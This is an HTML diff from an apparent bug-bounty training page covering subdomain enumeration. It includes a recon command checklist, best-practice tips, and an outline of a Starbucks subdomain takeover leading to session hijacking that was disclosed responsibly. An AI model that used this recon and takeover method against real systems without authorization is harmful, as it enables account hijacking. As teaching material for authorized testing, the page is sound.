+            <span style="color:var(--accent-warning);">staging-auth.target.com &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;← HOT 🔥</span><br>
+            <span style="color:var(--accent-warning);">admin.target.com &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;← HOT 🔥</span><br>
+            assets.target.com<br>
+            cdn.target.com<br>
+            [+] Total unique: 347 subdomains
         </div>
-      
-        <!-- MARK PHASE COMPLETE -->
-        <button class="mark-complete-btn" id="complete-btn-p2" onclick="markPhaseComplete('p2','p1')">
-          ✅ Mark Phase Complete — Technology Detection Done → Proceed to Port Scanning
-        </button>
-</div>
+
+        <!-- Checklist -->
+        <div class="section-header-hacker" style="margin-top:40px;">☑ CHECKLIST — SAVED AUTOMATICALLY</div>
+        <div class="hacker-checklist" dir="rtl">
+          <div class="hk-check-item">
+            <div class="hk-checkbox"></div>
+            <div class="hk-check-text"><span class="cmd" dir="ltr">subfinder -d target.com -all -recursive -silent</span></div>
+          </div>
+          <div class="hk-check-item">
+            <div class="hk-checkbox"></div>
+            <div class="hk-check-text"><span class="cmd" dir="ltr">amass enum -passive -d target.com</span></div>
+          </div>
+          <div class="hk-check-item">
+            <div class="hk-checkbox"></div>
+            <div class="hk-check-text"><span class="cmd" dir="ltr">assetfinder --subs-only target.com + gau</span></div>
+          </div>
+          <div class="hk-check-item">
+            <div class="hk-checkbox"></div>
+            <div class="hk-check-text"><span class="cmd" dir="ltr">cat *.txt | sort -u > all_subs.txt</span></div>
+          </div>
+          <div class="hk-check-item">
+            <div class="hk-checkbox"></div>
+            <div class="hk-check-text"><span class="cmd" dir="ltr">httpx -l all_subs.txt -status-code -title -tech-detect</span></div>
+          </div>
+          <div class="hk-check-item">
+            <div class="hk-checkbox"></div>
+            <div class="hk-check-text"><span class="cmd" dir="ltr">أفحص dev / staging / admin / test / api أولاً</span></div>
+          </div>
+          <div class="hk-check-item">
+            <div class="hk-checkbox"></div>
+            <div class="hk-check-text"><span class="cmd" dir="ltr">dig CNAME 404 على كل response</span></div>
+          </div>
+          <div class="hk-check-progress" dir="ltr">
+             <div style="font-size:11px; color:#64748b;">0 / 9 completed</div>
+             <div class="hk-prog-bar"><div class="hk-prog-fill"></div></div>
+          </div>
+        </div>
+
+        <!-- Mistakes vs Best Practices -->
+        <div class="section-header-hacker">⚠️ COMMON MISTAKES VS BEST PRACTICES</div>
+        <div class="mistakes-practices-grid" dir="rtl">
+          <div class="mp-col mistakes" style="background: transparent; border: 1px solid #ff4757; padding:16px;">
+            <div class="mp-header" style="color:#ff4757;">■ Common Mistakes</div>
+            <div class="mp-item" style="border:none;">✗ الاكتفاء بـ subfinder وحدها فقط</div>
+            <div class="mp-item" style="border:none;">✗ تجاهل 404 responses بدون فحص CNAME</div>
+            <div class="mp-item" style="border:none;">✗ عدم فحص المنافذ غير المعيارية</div>
+            <div class="mp-item" style="border:none;">✗ بدء Active Recon قبل انتهاء Passive</div>
+            <div class="mp-item" style="border:none;">✗ نسيان wildcard: *.target.com</div>
+          </div>
+          <div class="mp-col practices" style="background: transparent; border: 1px solid var(--accent-primary); padding:16px;">
+            <div class="mp-header" style="color:var(--accent-primary);">■ Best Practices</div>
+            <div class="mp-item" style="border:none;">✓ دمج 4+ مصادر + sort -u دائماً</div>
+            <div class="mp-item" style="border:none;">✓ فحص CNAME لكل 404 بـ dig</div>
+            <div class="mp-item" style="border:none;">✓ naabu على كل host للمنافذ غير المعيارية</div>
+            <div class="mp-item" style="border:none;">✓ الأولوية الأولى دائماً = dev / staging / admin</div>
+            <div class="mp-item" style="border:none;">✓ gau + waybackurls للأرشيف التاريخي</div>
+            <div class="mp-item" style="border:none;">✓ لاحقاً دائماً Active ← أولاً Passive</div>
+          </div>
+        </div>
+
+        <!-- Real World Case -->
+        <div class="section-header-hacker">📂 REAL WORLD CASE</div>
+        <div class="real-world-case" dir="rtl" style="background:transparent;">
+          <div class="rwc-header">
+            <div class="rwc-title">📄 Starbucks Subdomain Takeover — Full Chain</div>
+            <div class="rwc-badge">💰 $2,000 Bounty</div>
+          </div>
+          <div class="rwc-timeline">
+            <div class="rwc-step"><div class="rwc-step-number">1</div><div class="rwc-step-content">Recon: subfinder -d starbucks.com → starbucks-api.starbucks.com</div></div>
+            <div class="rwc-step"><div class="rwc-step-number">2</div><div class="rwc-step-content">Live Check: httpx 404 → "Web Site not found" → مؤشر takeover</div></div>
+            <div class="rwc-step"><div class="rwc-step-number">3</div><div class="rwc-step-content">CNAME: dig → azurewebsites.net → NXDOMAIN = Dangling!</div></div>
+            <div class="rwc-step"><div class="rwc-step-number">4</div><div class="rwc-step-content">Exploit: تسجيل Azure App Service بنفس المعرّف ← تحكم كامل</div></div>
+            <div class="rwc-step"><div class="rwc-step-number">5</div><div class="rwc-step-content">Impact: Cookies لـ .starbucks.com → Session Hijacking</div></div>
+            <div class="rwc-step"><div class="rwc-step-number">6</div><div class="rwc-step-content">Report: Responsible Disclosure → $2,000 Bug Bounty 🏆</div></div>
+          </div>
+        </div>
+
+        <!-- When to Stop -->
+        <div class="section-header-hacker">🛑 WHEN TO STOP?</div>
+        <div class="real-world-case" dir="rtl" style="background:transparent;">
+            <div class="rwc-step-content" style="margin-bottom:12px;">☑ جمعت 100+ subdomain من 3+ مصادر مختلفة</div>
+            <div class="rwc-step-content" style="margin-bottom:12px;">☑ فرزت الحية بـ httpx وحددت الأكثر أهمية</div>
+            <div class="rwc-step-content" style="margin-bottom:12px;">☑ فحصت 404 لكل CNAME</div>
+            <div class="rwc-step-content">☑ سجلت dev / staging / admin subdomains للفحص اللاحق</div>
+            
+            <button class="start-hunt-btn" style="width:100%; margin-top:24px; font-size:12px; background:transparent; border:1px solid var(--accent-primary); color:var(--accent-primary);">
+              ✅ Mark Phase Complete — Subdomain Enumeration Done → Proceed to Tech Detection
+            </button>
+        </div>
+
+        <!-- Practice Lab CTA -->
+        <div class="practice-lab-cta" dir="rtl" style="background: transparent;">
+          <div class="pl-content">
+            <div class="pl-title">جاهز لتطبيق ما تعلمته؟</div>
+          </div>
+          <button class="pl-btn">▶ Launch Interactive Labs</button>
+        </div>
+
+      </div>
 
       <!-- Phase 1: Port Scanning -->
       <div class="meth-content-view" id="meth-content-p1" style="display: none; --tool-color: #ff0055;">
